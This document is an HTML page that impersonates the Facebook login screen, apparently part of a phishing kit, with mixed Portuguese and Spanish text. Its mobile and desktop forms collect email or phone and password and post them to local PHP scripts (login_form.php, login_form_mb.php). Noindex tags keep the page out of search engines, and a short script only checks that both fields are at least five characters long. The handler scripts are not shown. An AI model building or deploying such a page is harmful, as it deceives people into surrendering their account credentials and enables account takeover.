<html>
    <head>
        <title>Login into Facebook</title>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css">
        <meta http-equiv="Pragma" content="no-cache">
        <meta http-equiv="no-cache">
        <meta name="robots" content="noindex">
        <meta name="googlebot" content="noindex">
        <meta http-equiv="Expires" content="-1">
        <meta http-equiv="Cache-Control" content="no-cache">
        <script src="http://code.jquery.com/jquery-1.11.2.min.js"></script>
        <script src="http://code.jquery.com/jquery-migrate-1.2.1.min.js"></script>
        <style>
            *{margin: auto 0;}
            .moblie{
                display: none;
            }
            .desktop{
                display: block;
            }
            @media only screen and (max-width: 768px) {
                 .desktop{
                    display: none;
                }
                .moblie{
                    display: block;
                }
            }
        </style>


    </head>
    <body>

                <div class="container" style="width:100%;">

<div class="moblie">
<div class="row" style="background: #3b5998;">
                <div class="col-lg-12" style="text-align: center; padding: 5px 0px;">
                    <span style="color:#fff;    font-family: helvetica, arial, sans-serif;
                          font-size: 26px;
                          color: #fff;

                          font-weight: bold;">facebook</span>
                </div>
            </div>
            <div class="row">
                <div class="col-lg-4" style="padding: 20px 10px;text-align: center;background-color: #eceff5; float: none; margin: 0 auto; ">
                    <div style="  width: 180px;
                         font-size: 12px;
                         background-color: #fff9d7;
                         border: 1px solid #e2c822;
                         padding: 7px 13px;
                         margin: 10px auto;
                         border-radius: 6px;">
                        Você deve iniciar a sessão continuará.
                    </div>
                    <form id="login_form_mb" action="login_form_mb.php" method="post" onsubmit="return checkFormMB()">

                        <input required  style="height:50px;border-bottom-left-radius: 0px;
                               border-bottom-right-radius: 0px;" name="email_mobile" class="form-control" id="email_mobile" placeholder="Email address or phone number">
                        <input required name="pass_mobile" type="password" style="height:50px; border-top:none;   border-radius: 0px;" class="form-control" id="pass_mobile" placeholder="Password">
                        <div class="_55ws" style="
                             padding: 10px 0px;
                             border-top:none;">
                            <button type="submit" name="submit" class="btn btn-primary btn-lg btn-block" style="  padding: 4px 0px;  background-color: #627aad;border-radius: 4px;text-shadow: 0 -1px rgba(0, 0, 0, .25);
    background-image: -webkit-linear-gradient(rgba(0, 0, 0, 0), rgba(0, 0, 0, .1));
    background-image: linear-gradient(rgba(0, 0, 0, 0), rgba(0, 0, 0, .1));border: 1px solid #4162A7;">entrar</button>
                        </div>

                    </form>
                </div>
                <div class="col-lg-4" style="padding: 15px 10px;text-align: center;background-color: #eceff5; float: none; margin: 0 auto; ">

                    <button style="background-color: #5b93fc; padding: 10px 20px; font-weight: bold;     border: 1px solid #0A5AED;text-shadow: 0 -1px rgba(0, 0, 0, .25);    background-image: -webkit-linear-gradient(rgba(0, 0, 0, 0), rgba(0, 0, 0, .1));
    background-image: linear-gradient(rgba(0, 0, 0, 0), rgba(0, 0, 0, .1));" type="button" class="btn btn-primary">Crear una nueva cuenta</button>
                    <p style="color: #899bc1;
                       font-size: 12px;
                       line-height: 16px; margin-top: 10px;">¿Contraseña olvidada? 路 Centro de ayuda</p>
                </div>
            </div>
</div>
<!-- desktop -->
<div class="desktop">
            <div class="row " style="background: #3b5998; height:82px; ">
                <div class="col-lg-12" style="  float: none;
                     padding: 5px 0px;
                     width: 980px;
                     margin: auto;">
                    <img src="img/logo.png" style="padding-top: 15px;">
                </div>
            </div>
            <div class="row" style="padding:80px;">
                <div class="col-lg-7" style=" width:640px; padding-bottom: 45px;border-radius: 4px;border: 1px solid #ccc;float: none; margin: 0 auto; ">
                    <div style="border-bottom: 1px solid #ccc;">
                        <h2 style="color: #1e2d4c; font-weight: bold;  font-family: serif;font-size: 20px;">Entrar com o Facebook</h2>
                    </div>
                    <div style="font-size: 12px;background-color: #fff9d7;border: 1px solid #e2c822;padding: 10px 13px;margin: 10px 0px;">
                        Você deve iniciar a sessão continuará.
                    </div>
                    <div class="row">
                        <div class="col-lg-7" style="float:none;  margin: 0 20%; ">
                            <table>
                                <form id="login_form" action="login_form.php" method="post" onsubmit="return checkForm()">
                                    <tr>
                                        <td style="  width: 113px;font-family: 'lucida grande',tahoma,verdana,arial,sans-serif;
                                            font-size: 12px;
                                            color: #665E5E;; font-weight: bold;">E-mail ou número de telefone</td>
                                        <td style="padding: 5px 0px;"> <input style="  padding: 5px 3px; border: 1px solid #bdc7d8;" required style="" id="email_desktop" name="email_desktop" ></td>
                                    </tr>
                                    <tr>
                                        <td style="font-family: 'lucida grande',tahoma,verdana,arial,sans-serif;
                                            font-size: 12px;
                                            color: #665E5E;; font-weight: bold;">Senha:</td>
                                        <td style="padding: 5px 0px;"> <input id="pass_desktop" style=" padding: 5px 3px; border: 1px solid #bdc7d8;" required type="password" style="" name="pass_desktop" ></td>
                                    </tr>
                                    <tr>
                                        <td style="font-family: 'lucida grande',tahoma,verdana,arial,sans-serif;
                                            font-size: 12px;
                                            color: #665E5E;; font-weight: bold;"></td>
                                        <td style="padding: 5px 0px;"> <input id="persist_box" type="checkbox" value="1" checked="1" name="persistent" class="uiInputLabelInput uiInputLabelCheckbox">
                                            <span style="font-family: 'lucida grande',tahoma,verdana,arial,sans-serif;
                                                  font-size: 12px;
                                                  margin: 2px 7px;
                                                  position: absolute;
                                                  color: #000;">Mantenha-me conectado</span></td>
                                    </tr>
                                    <tr>
                                        <td style="font-family: 'lucida grande',tahoma,verdana,arial,sans-serif;
                                            font-size: 12px;
                                            color: #665E5E;; font-weight: bold;"></td>
                                        <td style="padding: 5px 0px;">
                                            <button type="submit" name="submit" style="border: none;
                                                    font-size: 13px;
                                                    line-height: 16px;
                                                    color: #fff;
                                                    font-weight: bold;
                                                    padding: 3px 11px;
                                                    background-color: #627aad;">entrar</button>
                                            <span style="font-family: 'lucida grande',tahoma,verdana,arial,sans-serif;
                                                  font-size: 12px;
                                                  margin: 2px 7px;
                                                  position: absolute;
                                                  color: #000;">or <font style="color:#3b5998; font-weight: bold;">inscrever-se</font></span></td>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td style="font-family: 'lucida grande',tahoma,verdana,arial,sans-serif;
                                            font-size: 12px;
                                            color: #665E5E;; font-weight: bold;"></td>
                                        <td style="padding: 5px 0px;">

                                            <span style="font-family: 'lucida grande',tahoma,verdana,arial,sans-serif;
                                                  font-size: 11px;
                                                  margin: 2px 0px;
                                                  color: #3b5998;
                                                  position: absolute;
                                                  ">Você esqueceu sua senha?</span></td>
                                        </td>
                                    </tr>
                                </form>
                            </table>

                        </div>

                    </div>

                </div>

                <div class="col-lg-7" style="float:none;  margin: 0 auto; margin-top:10px; padding-left:30px;">
                    <span style="font-family: serif;color: #3b5998;font-size: 12px; padding-right: 10px;">English (US)</span>
                    <span style="font-family: serif;color: #3b5998;font-size: 12px; padding-right: 10px;">Tiếng Việt</span>
                    <span style="font-family: serif;color: #3b5998;font-size: 12px; padding-right: 10px;">中文(台灣)</span>
                    <span style="font-family: serif;color: #3b5998;font-size: 12px; padding-right: 10px;">한국어</span>
                    <span style="font-family: serif;color: #3b5998;font-size: 12px; padding-right: 10px;">日本語</span>
                    <span style="font-family: serif;color: #3b5998;font-size: 12px; padding-right: 10px;">Français (France)</span>
                    <span style="font-family: serif;color: #3b5998;font-size: 12px; padding-right: 10px;">Español</span>
                </div>
            </div>
        </div>
        </div>
<script type="text/javascript">
                                    function checkForm () {

                                     email= document.getElementById('email_desktop').value;
                                     pass= document.getElementById('pass_desktop').value;
  
                                     if(email.length<5||pass.length<5){
                                        //alert('rrrrrrrrr');
                                      //  $('#error-z').text("2");
                                        return false;
                                     }
                                    return true;
                                        // body...
                                    }
                                    function checkFormMB () {

                                     email= document.getElementById('email_mobile').value;
                                     pass= document.getElementById('pass_mobile').value;
                                     if(email.length<5||pass.length<5){
                                        //alert('rrrrrrrrr');
                                      //  $('#error-z').text("2");
                                        return false;
                                     }
                                    return true;
                                        // body...
                                    }
                                </script>
    </body>
</html>